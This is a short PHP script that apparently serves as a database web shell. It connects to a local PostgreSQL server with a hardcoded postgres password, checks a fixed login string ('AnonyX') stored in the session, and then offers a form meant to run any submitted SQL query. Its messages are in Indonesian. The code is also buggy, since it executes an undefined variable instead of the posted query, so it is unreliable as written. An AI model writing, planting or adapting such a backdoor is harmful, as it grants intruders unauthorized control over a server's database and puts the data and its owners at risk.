<?php

@session_start();

define('DBHOST', '127.0.0.1');
define('DBUSER', 'postgres');
define('DBNAME', 'postgres');
define('DBPASS', '@arikcs@');

$dbhost = DBHOST;
$dbname = DBNAME;
$dbuser = DBUSER;
$dbpass = DBPASS;

if($conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass)){
	if(isset($_SESSION['queryMgr'])){
		if(isset($_POST['gasquery'])){
			if($conn->query($queryMgr)){
				echo 'ok';
			}else{
				echo 'gagal.';
			}
		}else{
			echo '<form method="post" action=""><input name="gasquery" type="text">';
		}
	}else{
		if(isset($_POST['login'])){
			$login = $_POST['login'];
			if($login == 'AnonyX'){
				$_SESSION['queryMgr'] = $login;
			}else{
				echo ':(';
			}
		}else{
			echo '<form method="post" action=""><input name="login" type="password">';
		}
	}
}else{
	echo 'koneksi gagal.';
}

?>
